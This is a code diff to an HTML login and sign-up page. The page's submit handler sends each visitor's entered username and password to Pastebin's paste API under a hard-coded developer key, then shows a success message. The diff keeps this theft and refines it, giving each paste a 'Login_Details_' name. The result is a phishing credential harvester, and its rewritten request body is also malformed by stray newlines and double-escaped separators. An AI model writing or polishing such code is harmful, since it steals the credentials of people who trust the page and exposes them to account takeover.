@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login or Sign Up</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * {
       margin: 0;
@@ -35,7 +34,7 @@
 
     .modal-image {
       width: 40%;
-      background: url('https://images.unsplash.com/photo-1523240795612-9a054b0db644?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80') no-repeat center center;
+      background: url('https://images.unsplash.com/photo-1523240795612-9a054b0db644?ixlib=rb-4.0.3&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=80') no-repeat center center;
       background-size: cover;
       position: relative;
     }
@@ -169,7 +168,7 @@
       font-weight: bold;
       text-align: center;
       cursor: pointer;
-      transition: background 0/3s;
+      transition: background 0.3s;
     }
 
     .google-btn {
@@ -288,18 +287,22 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // Send to Pastebin
+      // Send to Pastebin using your API key
+      const api_dev_key = "8V7aqB0VFaGza0EfUFA6lda0WRRSI4W1"; // YOUR API KEY HERE
+
       fetch('https://pastebin.com/api/api_post.php', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
         },
-        body: 'api_dev_key=8V7aqB0VFaGza0EfUFA6lda0WRRSI4W1&amp;api_option=paste&amp;api_paste_code=' + encodeURIComponent(JSON.stringify({ username, password }))
+        body: `api_dev_key=${encodeURIComponent(api_dev_key)}
+               &amp;amp;api_option=paste
+               &amp;amp;api_paste_code=${encodeURIComponent(JSON.stringify({ username, password }))}
+               &amp;amp;api_paste_name=Login_Details_${Date.now()}` // Unique name for each paste
       });
 
       // Show success message
       document.getElementById('successMessage').style.display = 'block';
-      // Optional: Reset the form
       this.reset();
     });
   </script>
